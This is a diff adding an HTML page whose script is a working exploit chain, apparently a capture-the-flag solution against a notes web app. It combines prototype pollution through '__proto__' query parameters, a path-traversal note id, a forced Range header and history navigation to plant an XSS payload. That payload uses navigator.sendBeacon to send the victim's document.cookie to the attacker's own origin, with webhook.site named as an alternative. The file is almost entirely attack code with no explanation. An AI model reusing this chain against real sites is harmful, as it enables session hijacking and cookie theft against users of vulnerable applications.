@@ -1,0 +1,33 @@
+<body>
+  <script type="module">
+    const BASE_URL = new URLSearchParams(location.search).get("baseUrl"); // "http://web:3000";
+    const HOOK_URL = location.origin; // "https://webhook.site/xxxxx";
+
+    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+    const params1 = new URLSearchParams();
+    params1.append("_", "a");
+    params1.append("_", "b");
+    params1.append("id", "../notes#");
+    params1.append("__proto__[title]", "test");
+    params1.append(
+      "__proto__[content]",
+      `<img src onerror="navigator.sendBeacon('${HOOK_URL}',document.cookie)">`
+    );
+
+    const params2 = new URLSearchParams();
+    params2.append("_", "a");
+    params2.append("_", "b");
+    params2.append("id", `..${encodeURIComponent(`/?${params1}`)}#`);
+    params2.append("__proto__[headers][Range]", "bytes=1-");
+
+    const win = open("about:blank");
+    win.location = `${BASE_URL}/?${params1}`;
+    await sleep(1000);
+    win.location = `${BASE_URL}/?${params2}`;
+    await sleep(1000);
+    win.location = "about:blank";
+    await sleep(1000);
+    win.history.go(-2);
+  </script>
+</body>
